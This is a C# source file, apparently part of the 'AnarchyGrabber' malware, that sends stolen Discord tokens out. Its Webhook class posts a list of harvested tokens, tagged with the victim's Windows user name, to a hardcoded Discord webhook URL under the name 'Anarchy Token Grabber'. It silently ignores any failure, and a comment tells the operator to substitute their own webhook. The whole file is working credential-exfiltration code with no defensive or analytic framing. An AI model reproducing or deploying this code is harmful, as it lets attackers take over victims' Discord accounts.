using System;
using System.Collections.Generic;
using System.Net.Http;

namespace AnarchyGrabber
{
    public static class Webhook
    {
        //you've got to change this to your own discord webhook url
        private static readonly string _hookUrl = "https://discord.com/api/webhooks/912719031889449040/o1XqzepKWGPOH8vK2M5O8LJebFnmtRPI6J3TJqm9XFSW0gopiu1ThYnQXNC3U1Yht1bX";


        public static void ReportTokens(List<string> tokenReport)
        {
            try
            {
                HttpClient client = new HttpClient();
                Dictionary<string, string> contents = new Dictionary<string, string>
                    {
                        { "content", $"------------------\nToken report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}" },
                        { "username", "Anarchy Token Grabber" },
                        { "avatar_url", "https://media.discordapp.net/attachments/601457544380022790/609824918028419082/Anarchy.png" }
                    };

                client.PostAsync(_hookUrl, new FormUrlEncodedContent(contents)).GetAwaiter().GetResult();
            }
            catch { }
        }
    }
}
